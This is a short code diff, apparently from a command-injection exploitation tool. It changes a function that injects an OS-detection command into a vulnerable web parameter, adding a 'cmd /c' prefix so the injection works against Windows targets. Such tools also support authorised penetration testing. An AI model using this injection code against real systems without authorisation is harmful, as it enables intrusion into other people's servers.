@@ -53,7 +53,9 @@ Retrieve system information
 def system_information(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):     
   if settings.TARGET_OS == "win":
     settings.RECOGNISE_OS = settings.WIN_RECOGNISE_OS
-  cmd = settings.RECOGNISE_OS        
+  cmd = settings.RECOGNISE_OS 
+  if alter_shell:
+    cmd = "cmd /c " + cmd 
   response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   target_os = cb_injector.injection_results(response, TAG)
   if target_os:
